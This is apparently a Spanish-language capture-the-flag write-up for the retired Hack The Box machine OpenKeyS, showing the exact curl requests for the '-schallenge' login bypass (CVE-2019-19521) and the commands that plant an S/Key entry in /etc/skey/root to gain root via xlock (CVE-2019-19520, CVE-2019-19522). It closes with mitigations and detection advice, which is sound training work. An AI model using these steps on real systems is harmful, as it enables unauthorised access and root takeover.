---
machine: OpenKeyS
os: OpenBSD
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [openbsd, authentication-bypass, cve-2019-19521, xlock, skey]
---

# OpenKeyS — Hack The Box (OpenBSD)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un fichero `.swp` de Vim revela cómo el login llama a `auth_userokay`. La opción `-schallenge` (CVE-2019-19521) permite entrar como `jennifer` y recuperar su clave SSH. Después, `xlock` con el grupo `auth` (CVE-2019-19520) permite escribir `/etc/skey/root` y abusar de S/Key (CVE-2019-19522) para ser root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp  ssh   OpenSSH 8.1
80/tcp  http  OpenBSD httpd
```

## Enumeración

- La web es un portal de login en el vhost `openkeys.htb`.
- La enumeración de directorios encuentra un `.swp` de Vim y el binario `check_auth`.
- `strings` muestra `auth_userokay` y la ruta de `ld.so`.
- El código PHP de la sesión usa `$_REQUEST` y guarda el nombre de usuario.

## Foothold

El `.swp` contiene el código que pasa el usuario a `auth_userokay`. Si el nombre empieza por `-s`, la función interpreta la opción `-schallenge` y devuelve éxito sin validar la contraseña (CVE-2019-19521).

La sesión toma el nombre de `$_REQUEST`; se envía `username=-schallenge` para autenticar y después se fija `username=jennifer` para acceder a su perfil, donde está su clave SSH.

```bash
curl -c cookies.txt -d 'username=-schallenge&password=x' http://openkeys.htb/
curl -b cookies.txt -d 'username=jennifer' http://openkeys.htb/
```

## Movimiento lateral

Con la clave de `jennifer` se accede por SSH. La enumeración local confirma OpenBSD 6.6 y el grupo `wheel`; el objetivo es el grupo `auth`, que controla `/etc/skey`.

```bash
chmod 600 jennifer.key
ssh -i jennifer.key jennifer@openkeys.htb
```

## Escalada de privilegios

`/usr/X11R6/bin/xlock` es SGID `auth`. La CVE-2019-19520 permite conservar ese grupo al ejecutar una shell mediante la carga de una librería desde una ruta controlada.

Con el grupo `auth` se escribe `/etc/skey/root` con un registro S/Key conocido y permisos `0600`. Después se invoca `su` con autenticación S/Key (CVE-2019-19522) y se obtiene root.

```bash
ls -l /usr/X11R6/bin/xlock
echo 'root md5 0100 <SEED> <HASH>' > /etc/skey/root
chmod 0600 /etc/skey/root
su -a skey root
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- Un fichero de intercambio de Vim puede revelar lógica interna.
- Pasar entrada del usuario a una función con opciones es peligroso.
- Un SGID sobre una herramienta gráfica puede conservar grupos privilegiados.
- S/Key con archivos escribibles por `auth` es una vía directa a root.

## Mitigaciones y detección

- Parchear OpenBSD y no permitir que nombres de usuario empiecen por `-`.
- Revisar binarios SGID y eliminar los innecesarios.
- Restringir la escritura en `/etc/skey` al usuario root real.
- Monitorizar ejecuciones de `xlock` y cambios en `/etc/skey`.

## Referencias

- [0xdf — OpenKeyS](https://0xdf.gitlab.io/2020/12/12/htb-openkeys.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+openkeys)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+openkeys+writeup)
